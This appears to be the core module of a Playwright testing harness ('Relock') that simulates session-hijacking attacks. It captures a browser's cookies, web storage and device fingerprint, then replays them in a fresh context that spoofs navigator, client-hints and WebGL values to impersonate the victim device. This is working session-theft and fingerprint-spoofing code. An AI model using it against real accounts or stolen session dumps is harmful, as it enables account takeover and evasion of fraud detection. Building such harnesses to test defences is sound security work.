// attacks.mjs
// ─────────────────────────────────────────────────────────────────────────
// The auditable core of the Relock harness.
//
// Everything that touches your session lives in this one file, in plain
// Playwright. Read it before you run it. There is no hidden behaviour:
//   • capture()          — reads session material on the same machine (one-machine mode).
//   • captureForExport() — reads everything, incl. fingerprint, to a portable bundle (two-machine mode).
//   • replay()           — loads material into a fresh browser and navigates to the target.
//
// Device context per tier (see fingerprints.mjs and the README):
//   • T1 / T2 — one-machine: scrambled to look like a different, plausible device.
//               two-machine: machine B's own native fingerprint (a real different device).
//   • T3      — one-machine: native, same machine, fingerprint matches the victim.
//               two-machine: machine B spoofs the victim's captured fingerprint.
// ─────────────────────────────────────────────────────────────────────────

export const TIERS = {
  T1: {
    id: 'T1', name: 'Cookie Replay',
    captures: ['cookies'],
    blurb: 'Cookies only, replayed from a different device. Pass-the-cookie.',
  },
  T2: {
    id: 'T2', name: 'Session Hijack',
    captures: ['cookies', 'storage'],
    blurb: 'All cookies + localStorage + sessionStorage (the full infostealer dump), from a different device.',
  },
  T3: {
    id: 'T3', name: 'Identity Impersonation',
    captures: ['cookies', 'storage'],
    blurb: 'The same material as T2, with the victim device fingerprint matched — the IMPaaS case.',
  },
};

// ── storage + fingerprint readers (run in the victim page) ─────────────────
const readStorage = (page) => page.evaluate(() => {
  const dump = (store) => {
    const out = {};
    for (let i = 0; i < store.length; i++) { const k = store.key(i); out[k] = store.getItem(k); }
    return out;
  };
  return { ls: dump(window.localStorage), ss: dump(window.sessionStorage) };
});

const readFingerprint = (page) => page.evaluate(() => {
  let webgl = null;
  try {
    const gl = document.createElement('canvas').getContext('webgl');
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    webgl = { vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) };
  } catch (e) {}
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    languages: navigator.languages,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory || null,
    screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
    devicePixelRatio: window.devicePixelRatio,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    webgl,
  };
});

// ── CAPTURE (one-machine) ──────────────────────────────────────────────────
// Captures only the session material for the chosen tier; device context is
// handled at replay time. No fingerprint is read here.
export async function capture(victimPage, victimContext, tier) {
  const t = TIERS[tier];
  const loot = { tier, cookies: [], localStorage: {}, sessionStorage: {} };
  // Cookie STORE read (incl. HttpOnly), scoped to the logged-in origin.
  loot.cookies = await victimContext.cookies(victimPage.url());
  if (t.captures.includes('storage')) {
    const s = await readStorage(victimPage);
    loot.localStorage = s.ls; loot.sessionStorage = s.ss;
  }
  return loot;
}

// ── CAPTURE FOR EXPORT (two-machine) ───────────────────────────────────────
// Captures EVERYTHING machine B might need for any tier — cookies, storage,
// and the fingerprint (so B can match it for T3). Written to a portable file.
// ⚠ This file contains live session material (full account access). Treat it
//   as a secret: use throwaway test accounts, and delete it after import.
export async function captureForExport(victimPage, victimContext) {
  const s = await readStorage(victimPage);
  return {
    version: 1,
    exportedAt: new Date().toISOString(),
    origin: new URL(victimPage.url()).origin,
    target: victimPage.url(),
    cookies: await victimContext.cookies(victimPage.url()),
    localStorage: s.ls,
    sessionStorage: s.ss,
    fingerprint: await readFingerprint(victimPage),
  };
}

// Slice an exported bundle down to what a given tier should replay.
export function sliceLoot(exported, tier) {
  const t = TIERS[tier];
  return {
    tier,
    cookies: exported.cookies || [],
    localStorage: t.captures.includes('storage') ? (exported.localStorage || {}) : {},
    sessionStorage: t.captures.includes('storage') ? (exported.sessionStorage || {}) : {},
  };
}

// Turn a captured fingerprint into a replay-ready device profile (for B's T3).
export function deviceFromCapture(fp) {
  if (!fp) return null;
  const m = /Chrome\/(\d+)/.exec(fp.userAgent || '');
  const platform = fp.platform || 'Win32';
  const uaPlatform = platform === 'MacIntel' ? 'macOS' : platform.startsWith('Win') ? 'Windows' : 'Linux';
  return {
    label: 'captured victim device (matched)',
    userAgent: fp.userAgent,
    locale: (fp.languages && fp.languages[0]) || 'en-US',
    timezoneId: fp.timezone,
    screen: fp.screen,
    viewport: fp.screen ? { width: fp.screen.width, height: Math.max(360, fp.screen.height - 120) } : undefined,
    deviceScaleFactor: fp.devicePixelRatio || 1,
    platform,
    languages: fp.languages || ['en-US', 'en'],
    hardwareConcurrency: fp.hardwareConcurrency,
    deviceMemory: fp.deviceMemory,
    webgl: fp.webgl,
    uaPlatform,
    uaPlatformVersion: uaPlatform === 'Windows' ? '15.0.0' : uaPlatform === 'macOS' ? '14.5.0' : '',
    major: m ? m[1] : undefined,
  };
}

// ── summary of captured material (terminal readout) ────────────────────────
const looksLikeJwt = (v) =>
  typeof v === 'string' && /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(v);

export function summarize(loot) {
  const lines = [];
  const plural = (n, word) => `${n} ${word}${n === 1 ? '' : 's'}`;
  const httpOnly = loot.cookies.filter((c) => c.httpOnly).length;
  let cookieLine = plural(loot.cookies.length, 'cookie') + (httpOnly ? `  (${httpOnly} HttpOnly)` : '');
  if (loot.tier === 'T1') cookieLine += '  — the whole cookie store';
  lines.push(cookieLine);
  if (loot.tier !== 'T1') {
    const jwtCount = Object.values(loot.localStorage).filter(looksLikeJwt).length;
    lines.push(`localStorage   ${plural(Object.keys(loot.localStorage).length, 'key')}` +
      (jwtCount ? `  (${jwtCount} ${jwtCount === 1 ? 'value looks' : 'values look'} like a JWT)` : ''));
    lines.push(`sessionStorage ${plural(Object.keys(loot.sessionStorage).length, 'key')}`);
  }
  return lines;
}

// Strip query and fragment so we never display or record a URL that might
// carry a token (some apps put access tokens in ?query or #fragment).
const safeUrl = (u) => {
  try { const x = new URL(u); return x.origin + x.pathname; }
  catch { return '[unparseable-url]'; }
};

// ── REPLAY ───────────────────────────────────────────────────────────────
// Builds a FRESH context, injects the loot, navigates to the target.
//   device — a profile to present (library profile for one-machine T1/T2, or a
//            captured profile for two-machine T3), or null to inherit this
//            machine's native fingerprint.
export async function replay(browser, target, loot, device = null) {
  const origin = new URL(target).origin;

  const contextOpts = {};
  let fp = null;
  if (device) {
    const major = device.major || (browser.version() || '137.0.0.0').split('.')[0];
    const ua = device.uaTemplate ? device.uaTemplate.replace('{chrome}', `${major}.0.0.0`) : device.userAgent;
    if (ua) contextOpts.userAgent = ua;
    if (device.locale) contextOpts.locale = device.locale;
    if (device.timezoneId) contextOpts.timezoneId = device.timezoneId;
    if (device.screen) {
      contextOpts.screen = device.screen;
      contextOpts.viewport = device.viewport || { width: device.screen.width, height: Math.max(360, device.screen.height - 120) };
    }
    if (device.deviceScaleFactor) contextOpts.deviceScaleFactor = device.deviceScaleFactor;
    fp = { ...device, major };
  }

  const attacker = await browser.newContext(contextOpts);

  // Make the remaining signals coherent with the presented device, before any
  // page script runs. Coherent on string signals; the canvas/WebGL pixel hash
  // and TLS/JA3 remain this machine's (see README).
  if (fp) {
    await attacker.addInitScript((p) => {
      const def = (o, k, v) => { try { Object.defineProperty(o, k, { get: () => v, configurable: true }); } catch (e) {} };
      if (p.platform) def(navigator, 'platform', p.platform);
      if (p.languages) def(navigator, 'languages', p.languages);
      if (p.hardwareConcurrency != null) def(navigator, 'hardwareConcurrency', p.hardwareConcurrency);
      if (p.deviceMemory != null) def(navigator, 'deviceMemory', p.deviceMemory);
      try {
        if (p.uaPlatform) {
          const brands = [
            { brand: 'Google Chrome', version: p.major },
            { brand: 'Chromium', version: p.major },
            { brand: 'Not.A/Brand', version: '24' },
          ];
          def(navigator, 'userAgentData', {
            brands, mobile: false, platform: p.uaPlatform,
            getHighEntropyValues: async () => ({
              architecture: 'x86', bitness: '64', brands, mobile: false, model: '',
              platform: p.uaPlatform, platformVersion: p.uaPlatformVersion || '',
              uaFullVersion: `${p.major}.0.0.0`, fullVersionList: brands,
            }),
          });
        }
      } catch (e) {}
      if (p.webgl) {
        const patch = (proto) => {
          if (!proto) return;
          const gp = proto.getParameter;
          proto.getParameter = function (x) {
            if (x === 37445) return p.webgl.vendor;   // UNMASKED_VENDOR_WEBGL
            if (x === 37446) return p.webgl.renderer; // UNMASKED_RENDERER_WEBGL
            return gp.call(this, x);
          };
        };
        try { patch(WebGLRenderingContext.prototype); } catch (e) {}
        try { patch(WebGL2RenderingContext.prototype); } catch (e) {}
      }
    }, fp);
  }

  if (loot.cookies && loot.cookies.length) await attacker.addCookies(loot.cookies);

  const page = await attacker.newPage();

  const hasStorage =
    Object.keys(loot.localStorage || {}).length || Object.keys(loot.sessionStorage || {}).length;
  if (hasStorage) {
    await page.goto(origin, { waitUntil: 'domcontentloaded' }).catch(() => {});
    await page.evaluate(({ ls, ss }) => {
      for (const [k, v] of Object.entries(ls || {})) localStorage.setItem(k, v);
      for (const [k, v] of Object.entries(ss || {})) sessionStorage.setItem(k, v);
    }, { ls: loot.localStorage, ss: loot.sessionStorage });
  }

  await page.goto(target, { waitUntil: 'domcontentloaded' }).catch(() => {});

  const rawUrl = page.url();
  const finalUrl = safeUrl(rawUrl);
  const looksLikeLogin = /login|sign-?in|auth(enticate)?/i.test(rawUrl);

  return { attacker, page, finalUrl, looksLikeLogin, device: device ? device.label : 'this machine (native)' };
}
